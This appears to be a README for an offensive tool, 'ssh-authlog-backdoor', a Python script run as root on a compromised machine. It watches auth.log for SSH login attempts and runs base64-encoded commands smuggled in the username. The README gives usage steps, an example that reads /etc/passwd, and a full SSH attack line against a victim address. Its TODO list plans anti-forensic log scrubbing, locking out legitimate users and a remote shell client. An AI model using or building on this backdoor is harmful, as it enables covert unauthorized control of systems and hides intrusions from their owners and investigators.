# ssh-authlog-backdoor

A post exploit python script that watches auth.log for a keyword then executes base64 encoded commands.  


## How to use

1. Execute the script as root on the victim box.

2. Encode a command in base64 by using an online service or how ever you can get base64. https://www.base64encode.org/

   Example:
   ``` cat /etc/passwd > /tmp/test ```
   is
   ```Y2F0IC9ldGMvcGFzc3dkID4gL3RtcC90ZXN0```
   
3. From an attacking box initiate an ssh connection as the user ```shadow---``` + ```base64 encoded command```
   
   Full example: ```ssh shadow---Y2F0IC9ldGMvcGFzc3dkID4gL3RtcC90ZXN0@VICTIM.IP``` 
   
 
### TODO
1. Make client to run on attacker box that can handle responces that will be sent out by backdoor. (Semi-interactive shell)
   - In progress! Needs cleaner workflow and better timing
2. Use better encoding/encryption on commands to aid in anti-forensics
3. Have the program disable ssh login with pw and block all users (If we want to be the sole individual with access. Will need the script to be able to restart itself in this case). To make it quieter, find a way to disallow the user starting with shadow. That way, there is no password prompt.
4. Remove more than just the lines with shadow in them (all related to the connection attempts)
5. Get the program to start reading from the eof auth.log, so only new commands are executed

Maybe later:
6. Program it to smoothly shutdown and clean up when a process kill is detected
